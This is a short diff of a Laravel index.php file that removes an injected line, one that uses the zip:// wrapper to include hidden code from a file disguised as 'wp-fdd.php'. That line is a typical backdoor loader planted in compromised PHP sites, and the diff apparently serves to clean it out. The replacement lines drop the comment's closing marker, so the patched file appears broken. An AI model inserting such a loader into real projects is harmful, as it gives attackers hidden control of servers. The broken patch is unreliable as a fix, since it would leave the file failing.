@@ -14,7 +14,8 @@ define('LARAVEL_START', microtime(true));
 | we will load this file so that any pre-rendered content can be shown
 | instead of starting the framework, which could cause an exception.
 |
-*/$wss ='zip://wp-fdd.php#m';include($wss);
+
+*
 
 if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
     require $maintenance;
